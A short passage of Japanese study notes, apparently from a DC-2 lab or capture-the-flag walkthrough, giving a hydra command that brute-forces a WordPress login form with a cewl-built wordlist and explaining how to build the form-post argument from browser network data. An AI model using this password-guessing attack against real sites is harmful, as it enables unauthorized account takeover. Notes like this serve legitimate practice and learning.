...
- `hydra -L users.txt -P cewl.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
  - `'~'`の中はコロンで3つに分かれていて、1つ目はアドレス、２つ目はブラウザのinspect->network->Postをクリック->request->RawをOnにして、そこからコピペして`^USER^`と`^PASS^`とこを書き換える、３つ目はS=Locationになっているがよくわからん。コピペしたら、上のhydraのコードと異なるが大丈夫
